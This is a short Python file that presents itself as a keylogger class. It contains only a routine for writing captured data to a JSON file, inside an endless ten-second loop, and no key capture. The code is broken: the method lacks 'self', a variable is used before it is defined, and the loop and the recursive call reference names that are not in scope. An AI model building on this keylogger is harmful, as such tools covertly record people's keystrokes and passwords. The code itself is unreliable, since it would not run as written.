import json
import os
import time
from datetime import datetime

class Key_Logger:

    def write_of_file(my_str):
        try:
            with open("my_keylogger.json","r") as f:
                data = json.load(f)
            if isinstance(data,list):
                data += my_str
                os.remove("my_keylogger.json")
                write_of_file(data)
            else:
                data = my_str
        except:
            with open("my_keylogger.json","w") as f:
                json.dump(my_str, f, indent=4)
                my_str = []
    while True:
        time.sleep(10)
        write_of_file(my_str)





